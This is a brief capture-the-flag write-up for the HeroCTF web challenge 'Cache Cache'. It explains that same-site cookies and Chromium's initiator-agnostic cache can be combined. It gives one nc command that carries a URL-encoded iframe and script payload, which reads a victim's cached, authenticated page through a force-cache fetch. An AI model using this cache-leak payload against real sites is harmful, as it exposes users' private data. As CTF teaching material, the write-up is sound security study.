# Cache Cache

This challenge aims to force the user to exploit two things:

- Cookies are always sent with same-site requests.
- Chromium’s cache does not take the initiator into account.

```sh
echo "http://web.heroctf.fr:5300/download/%3Ciframe%20srcdoc=%22%3Cimg%20src='http:&sol;&sol;cache-cache.heroctf.fr:5100&sol;'%3E%3Cscript%3EsetTimeout(()%20=%3E%7Bfetch('http:&sol;&sol;cache-cache.heroctf.fr:5100&sol;',%7Bmethod:%20'GET',cache:%20'force-cache'%20%7D).then(d=%3Ed.text()).then(console.log);%7D,500);%3C&sol;script%3E%22%3E" | nc cache-cache.heroctf.fr 5101
```